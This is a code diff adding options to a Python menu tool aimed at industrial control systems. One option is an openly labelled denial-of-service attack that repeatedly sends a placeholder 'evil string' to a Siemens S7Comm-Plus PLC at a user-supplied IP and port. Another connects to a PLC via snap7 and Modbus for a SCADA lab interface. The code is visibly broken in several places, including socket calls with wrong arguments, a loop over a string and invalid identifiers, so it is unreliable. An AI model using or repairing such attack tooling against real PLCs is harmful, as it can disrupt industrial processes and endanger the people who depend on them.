@@ -1,6 +1,10 @@
 from numpy import character
 from S7comm import mainS7comm
-from S7comm-plus import pr
+import sys, socket, pickle, struct,time, threading, snap7
+from tkinter import *
+from pymodbus.client.sync import ModbusTcpClient
+from SCADA import SCADA_LAB
+from time import sleep 
 import os
 
 def clearScreen():
@@ -93,9 +97,38 @@ if __name__ == "__main__":
                     print('Invalid option. Please enter a number between 1 and 4.\n\n')
 
         elif option == 2:
-            S7Comm-plus()
+            print("For S7Comm-Plus there is a denial of service attak. You will be asked for some information\n\n")
+            print("========== IMPORTANT ===========\n")
+            print("The only way to stop this attack is closing this programm or typing cntrl+C or waiting it to complete the iterations\n\n")
+
+            IP = str(input('Please, type in the destination IP: '))
+            PORT = str(input('Please, type in the S7Comm-plus port (default is 102 for Siemens): '))
+            ITERS = str(input('Please, type in the the number of tries the denial of service will run (equals running time): '))
+
+            for x in range(1,ITERS): 
+                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                connect=s.connect(IP, PORT)
+                s.send('some evil string \r\n\n') 
+                print ("bufff " + str(x) + " sent...\n")
+                result=s.recv(1024) 
+                print(result )
+                s.close() 
+                sleep(7)
+            
         elif option == 3:
-            SCADA()
+            IP = str(input('Please, type in the destination IP: '))
+            RACK = str(input('Please, type in the RACK (DEFAULT IS 0): '))
+            SLOT = str(input('Please, type in the the SLOT (DEFAULT IS 1): '))    
+
+            plc = snap7.client.Client() #Creates a client
+            plc.connect(IP,RACK,SLOT)   #Connects to the client
+            QB = plc.ab_read(2,7)
+
+            client = ModbusTcpClient(IP)
+            #client.write_coil(0, 0)
+            client.close()
+
+            g = SCADA_LAB.GUI(plc,client)
         elif option == 4:
             P&P()
         elif option == 5:
@@ -103,4 +136,5 @@ if __name__ == "__main__":
             exit()
         else:
             print('Invalid option. Please enter a number between 1 and 5.\n\n')
+
 
